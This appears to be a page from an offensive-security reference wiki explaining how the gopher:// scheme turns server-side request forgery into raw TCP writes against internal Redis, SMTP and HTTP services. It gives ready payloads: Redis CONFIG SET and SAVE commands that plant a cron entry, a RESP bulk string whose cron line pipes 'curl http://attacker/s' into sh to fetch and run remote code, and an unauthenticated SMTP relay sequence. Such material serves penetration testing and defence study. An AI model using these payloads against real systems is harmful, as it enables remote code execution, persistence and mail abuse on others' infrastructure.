---
title: "Gopher scheme for raw-socket SSRF"
description: "The gopher:// handler writes attacker-controlled bytes to a TCP port, which smuggles crafted protocol payloads into Redis, SMTP, and HTTP services and is the most powerful SSRF scheme."
keywords:
  - gopher scheme
  - gopher://
  - Redis RCE
  - raw TCP
  - SMTP smuggling
  - CRLF payload
---

# Gopher

The `gopher://` scheme is the strongest SSRF escalation because it writes an arbitrary byte stream to a chosen TCP port. Where [DICT](dict.md) sends one line, gopher sends a whole crafted request, so it smuggles complete protocol exchanges into internal services that assume only trusted local clients reach them.

## How the bytes are built

The URL is `gopher://host:port/` followed by a single item-type character (conventionally `_`, and ignored) and then the payload, URL-encoded. Carriage return and line feed are `%0d%0a`, which is what lets a payload span the multiple lines a real protocol needs:

```
gopher://127.0.0.1:6379/_<url-encoded bytes>
```

Everything after the item-type character is sent verbatim on the connection.

## Redis

Redis accepts inline commands terminated by CRLF, so a gopher payload drives it directly. A simple write, with `%0d%0a` ending the line:

```
gopher://127.0.0.1:6379/_set%20ssrf%20proof%0d%0a
```

Chaining several CRLF-separated lines in one payload runs a sequence. The classic persistence route reconfigures where Redis saves its database, writes an attacker-controlled key, then dumps it so the file lands in a useful location (a cron entry under `/var/spool/cron`, an authorized key, or a web shell in a served directory). The reconfiguration commands have no embedded newlines, so they go as inline lines:

```
CONFIG SET dir /var/spool/cron
CONFIG SET dbfilename root
SAVE
```

The payload key is the subtlety. A cron entry needs embedded newlines, and inline Redis protocol treats a newline as the end of a command, so the value cannot be sent inline. It must go as a **RESP bulk string**, whose declared byte length counts the newlines, so Redis reads the whole multi-line value as one argument:

```
*3\r\n$3\r\nSET\r\n$1\r\nx\r\n$<N>\r\n\n\n*/1 * * * * curl http://attacker/s|sh\n\n\r\n
```

`$<N>` is the exact byte length of the value that follows (the two leading newlines, the cron line, and the two trailing newlines); the `\r\n` after it terminates the bulk string, while the `\n` inside it are data. The whole stream is then URL-encoded after the gopher item type, with `%0d%0a` for the RESP framing CRLFs and `%0a` for the data newlines. Sent inline with raw newlines instead, Redis would parse the cron text as separate malformed commands and the key would never hold the payload.

## SMTP and HTTP

The same primitive speaks any text protocol. An internal SMTP server with no authentication relays mail when handed a full envelope:

```
gopher://127.0.0.1:25/_HELO%20x%0d%0aMAIL%20FROM:<a@x>%0d%0aRCPT%20TO:<b@y>%0d%0aDATA%0d%0aSubject:test%0d%0a%0d%0abody%0d%0a.%0d%0a
```

A crafted HTTP request to an internal service (including a `POST` with a body, which a plain `http://` sink cannot shape) is written the same way, line by line with `%0d%0a`, letting gopher forge requests a normal HTTP fetch could not.

## Why it is the priority scheme

Gopher converts SSRF from a read primitive into a write primitive against internal services, which is the step from information disclosure to code execution. When a [Port](../authority/port.md) scan finds Redis, memcached, or an unauthenticated SMTP or HTTP service, gopher is the scheme that acts on it. It depends on the client honoring `gopher://` (curl-backed clients commonly do), so confirm the handler first.

## References

- [PayloadsAllTheThings: Server Side Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [curl: supported protocols](https://curl.se/docs/url-syntax.html)
